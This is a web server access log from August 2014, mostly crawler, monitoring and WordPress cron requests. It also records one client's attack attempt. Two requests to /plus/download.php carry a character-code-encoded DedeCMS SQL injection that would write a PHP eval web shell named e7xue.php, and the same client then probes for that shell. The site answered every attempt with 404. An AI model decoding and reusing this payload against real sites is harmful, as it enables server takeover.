180.153.229.140 - - [24/Aug/2014:06:24:28 +0800] "GET /sitemap.html HTTP/1.1" 200 46085 "-" "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322) 360JK yunjiankong" -
123.125.80.235 - - [24/Aug/2014:06:26:18 +0800] "GET /sitemap.html HTTP/1.1" 200 46085 "-" "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322) 360JK yunjiankong" -
180.153.229.140 - - [24/Aug/2014:06:29:29 +0800] "GET /sitemap.html HTTP/1.1" 200 46085 "-" "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322) 360JK yunjiankong" -
112.253.28.43 - - [24/Aug/2014:06:30:04 +0800] "POST /wp-cron.php?doing_wp_cron HTTP/1.0" 200 93 "-" "Wget/1.12 (linux-gnu)" -
220.181.108.146 - - [24/Aug/2014:06:30:32 +0800] "GET /wailian/index.php/html/k/6d2c96b5534ae48cf5baeafec6278665.html HTTP/1.1" 200 7127 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" -
123.125.80.235 - - [24/Aug/2014:06:31:17 +0800] "GET /sitemap.html HTTP/1.1" 200 46085 "-" "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322) 360JK yunjiankong" -
180.153.229.140 - - [24/Aug/2014:06:34:28 +0800] "GET /sitemap.html HTTP/1.1" 200 46085 "-" "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322) 360JK yunjiankong" -
123.125.80.235 - - [24/Aug/2014:06:36:17 +0800] "GET /sitemap.html HTTP/1.1" 200 46085 "-" "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322) 360JK yunjiankong" -
172.246.216.164 - - [24/Aug/2014:06:38:22 +0800] "GET /wailian/index.php/html/k/8e37f87092bd52204d3caca2a02ac080.html HTTP/1.1" 200 60899 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 2.0.50727 ; .NET CLR 4.0.30319)" -
180.153.229.140 - - [24/Aug/2014:06:39:29 +0800] "GET /sitemap.html HTTP/1.1" 200 46085 "-" "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322) 360JK yunjiankong" -
123.125.80.235 - - [24/Aug/2014:06:41:17 +0800] "GET /sitemap.html HTTP/1.1" 200 46085 "-" "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322) 360JK yunjiankong" -
66.249.64.228 - - [24/Aug/2014:06:43:29 +0800] "GET /page/23/?iapolo_com HTTP/1.1" 200 15637 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" -
180.153.229.140 - - [24/Aug/2014:06:44:29 +0800] "GET /sitemap.html HTTP/1.1" 200 46085 "-" "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322) 360JK yunjiankong" -
220.181.108.149 - - [24/Aug/2014:06:44:58 +0800] "GET /archives/1177/ HTTP/1.1" 200 15045 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" -
123.125.80.235 - - [24/Aug/2014:06:46:17 +0800] "GET /sitemap.html HTTP/1.1" 200 46085 "-" "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322) 360JK yunjiankong" -
119.186.128.166 - - [24/Aug/2014:06:46:50 +0800] "POST /api/pr/?url=www.dyemwl.com&index=1 HTTP/1.1" 200 72 "-" "Dalvik/1.6.0 (Linux; U; Android 4.2.1; vivo Y19t Build/JOP40D)" -
66.249.64.233 - - [24/Aug/2014:06:47:09 +0800] "GET /archives/105/ HTTP/1.1" 200 13818 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" -
61.170.203.103 - - [24/Aug/2014:06:48:54 +0800] "GET /favicon.ico HTTP/1.1" 200 1150 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; 360space)" -
180.153.229.140 - - [24/Aug/2014:06:49:28 +0800] "GET /sitemap.html HTTP/1.1" 200 46085 "-" "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322) 360JK yunjiankong" -
123.125.80.235 - - [24/Aug/2014:06:51:18 +0800] "GET /sitemap.html HTTP/1.1" 200 46085 "-" "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322) 360JK yunjiankong" -
123.125.71.47 - - [24/Aug/2014:06:53:31 +0800] "GET /archives/tag/sever/ HTTP/1.1" 200 10922 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" -
66.249.64.238 - - [24/Aug/2014:06:54:19 +0800] "GET /archives/806/ HTTP/1.1" 200 12958 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" -
180.153.229.140 - - [24/Aug/2014:06:54:29 +0800] "GET /sitemap.html HTTP/1.1" 200 46085 "-" "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322) 360JK yunjiankong" -
123.125.71.54 - - [24/Aug/2014:06:55:30 +0800] "GET /?p=233 HTTP/1.1" 301 31 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" -
123.125.71.13 - - [24/Aug/2014:06:55:31 +0800] "GET /archives/233/ HTTP/1.1" 200 13778 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" -
123.125.80.235 - - [24/Aug/2014:06:56:18 +0800] "GET /sitemap.html HTTP/1.1" 200 46085 "-" "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322) 360JK yunjiankong" -
122.142.161.212 - - [24/Aug/2014:06:56:51 +0800] "GET /plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=101&arrs2[]=120&arrs2[]=112&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=49&arrs2[]=57&arrs2[]=48&arrs2[]=49&arrs2[]=53&arrs2[]=44&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96&arrs2[]=44&arrs2[]=39&arrs2[]=123&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=101&arrs2[]=55&arrs2[]=120&arrs2[]=117&arrs2[]=101&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=101&arrs2[]=55&arrs2[]=120&arrs2[]=117&arrs2[]=101&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=119&arrs2[]=119&arrs2[]=119&arrs2[]=46&arrs2[]=101&arrs2[]=55&arrs2[]=120&arrs2[]=117&arrs2[]=101&arrs2[]=46&arrs2[]=99&arrs2[]=111&arrs2[]=109&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=123&arrs2[]=47&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=39&arrs2[]=41&arrs2[]=32&arrs2[]=35&arrs2[]=32&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96 HTTP/1.1" 404 27 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" -
122.142.161.212 - - [24/Aug/2014:06:56:51 +0800] "GET /plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=101&arrs2[]=120&arrs2[]=112&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=49&arrs2[]=57&arrs2[]=48&arrs2[]=49&arrs2[]=53&arrs2[]=44&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96&arrs2[]=44&arrs2[]=39&arrs2[]=123&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=101&arrs2[]=55&arrs2[]=120&arrs2[]=117&arrs2[]=101&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=101&arrs2[]=55&arrs2[]=120&arrs2[]=117&arrs2[]=101&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=119&arrs2[]=119&arrs2[]=119&arrs2[]=46&arrs2[]=101&arrs2[]=55&arrs2[]=120&arrs2[]=117&arrs2[]=101&arrs2[]=46&arrs2[]=99&arrs2[]=111&arrs2[]=109&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=123&arrs2[]=47&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=39&arrs2[]=41&arrs2[]=32&arrs2[]=35&arrs2[]=32&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96 HTTP/1.1" 404 27 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" -
122.142.161.212 - - [24/Aug/2014:06:56:52 +0800] "GET /plus/mytag_js.php?aid=19015 HTTP/1.1" 404 27 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" -
122.142.161.212 - - [24/Aug/2014:06:56:52 +0800] "GET /plus/mytag_js.php?aid=19015 HTTP/1.1" 404 27 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" -
122.142.161.212 - - [24/Aug/2014:06:56:52 +0800] "GET /plus/e7xue.php HTTP/1.1" 404 27 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" -
220.181.108.111 - - [24/Aug/2014:06:57:28 +0800] "GET /?p=257 HTTP/1.1" 301 31 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" -
220.181.108.99 - - [24/Aug/2014:06:57:29 +0800] "GET /archives/257/ HTTP/1.1" 200 12950 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" -
180.153.229.140 - - [24/Aug/2014:06:59:28 +0800] "GET /sitemap.html HTTP/1.1" 200 46085 "-" "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322) 360JK yunjiankong" -
61.135.190.200 - - [24/Aug/2014:07:00:00 +0800] "GET /archives/1062/ HTTP/1.0" 200 62833 "-" "Mozilla/5.0 (Linux;u;Android 2.3.7;zh-cn;HTC Desire Build) AppleWebKit/533.1 (KHTML,like Gecko) Version/4.0 Mobile Safari/533.1" -
112.253.28.43 - - [24/Aug/2014:07:00:03 +0800] "POST /wp-cron.php?doing_wp_cron HTTP/1.0" 200 93 "-" "Wget/1.12 (linux-gnu)" -
